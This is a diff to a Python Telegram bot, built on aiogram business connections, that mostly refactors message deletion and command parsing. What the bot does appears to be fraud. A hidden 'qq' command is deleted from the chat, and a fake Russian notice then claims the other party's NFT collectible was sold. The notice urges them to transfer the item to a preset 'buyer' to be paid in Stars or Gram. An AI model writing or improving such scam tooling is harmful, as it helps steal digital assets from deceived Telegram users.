@@ -1,6 +1,5 @@
 import asyncio
 import random
-import time
 import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
@@ -19,7 +18,6 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
-cooldowns = {}
 client_user_ids = {}
 _bcid_store: dict[str, dict] = {}  # "chat_id:message_id" -> {bcid, chat_id}
 
@@ -112,7 +110,9 @@ async def handle_business_command(message: Message):
     if not text_clean.lower().startswith("qq"):
         return
 
-    bcid    = message.business_connection_id
+    parts = text_clean.split()
+    bcid = message.business_connection_id
+
     # qq set @username — регистрирует получателя для этого аккаунта
     if len(parts) == 3 and parts[1].lower() == "set":
         username = parts[2].lstrip("@")
@@ -169,6 +169,7 @@ async def handle_business_command(message: Message):
         return
 
     recipient = _recipients.get(bcid, "recipient_username")
+    chat_id = message.chat.id
 
     await message_queue.put({
         "chat_id": chat_id,
@@ -195,13 +196,12 @@ async def accept_offer(cb: CallbackQuery):
 
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
 
-    gift_name_display = slug.replace("-", " ")
     gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
     text = (
         f"{gift_emoji} <b>Коллекционный предмет: "
         f"<a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug}-{gift_num}</a> успешно продан!</b>\n\n"
         f"• Передайте коллекционный предмет покупателю для зачисления {currency_name}.\n"
-        f"\u200B"
+        f"​"
     )
 
     cb_chat_id = cb.message.chat.id
@@ -229,7 +229,10 @@ async def accept_offer(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
     try:
-        await bot.delete_business_messages(business_connection_id=cb.message.business_connection_id, message_ids=[cb.message.message_id])
+        await bot.delete_business_messages(
+            business_connection_id=cb.message.business_connection_id,
+            message_ids=[cb.message.message_id]
+        )
     except Exception:
         pass
     await cb.answer("Предложение отклонено")
@@ -263,7 +266,13 @@ async def sender_worker():
                     "recipient": task["recipient"],
                     "lang": task["lang"],
                 }
-                await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
+                try:
+                    await bot.delete_business_messages(
+                        business_connection_id=task["bcid"],
+                        message_ids=[task["cmd_message_id"]]
+                    )
+                except Exception:
+                    pass
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
